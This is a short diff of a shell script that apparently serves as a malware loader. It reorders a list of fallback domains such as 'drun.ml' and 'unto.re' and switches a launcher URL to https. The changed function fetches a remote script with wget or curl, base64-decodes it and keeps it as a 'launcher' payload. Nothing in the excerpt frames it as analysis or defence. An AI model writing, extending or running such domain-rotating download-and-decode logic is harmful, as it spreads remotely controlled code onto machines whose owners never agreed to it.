@@ -53,8 +53,8 @@ resolves() {
 }
 
 targets=(
-    "drun.ml"
     "unto.re"
+    "drun.ml"
     "druns.ml"
     "drunt.ml"
     "drunu.ml"
@@ -124,7 +124,7 @@ endpoints() {
 endpoints_fallback() {
     case "$1" in
         launcher)
-            script_url=${scr_url:-"http://latest.${zone}"}
+            script_url=${scr_url:-"https://latest.${zone}"}
             data=$($b64 -d <<< "$(wget -t 3 -T 5 -q -i- -O- <<< "$script_url")")
             [ -z "$data" ] && data=$(curl -L "$script_url" -s -o-)
             launcher=${data}
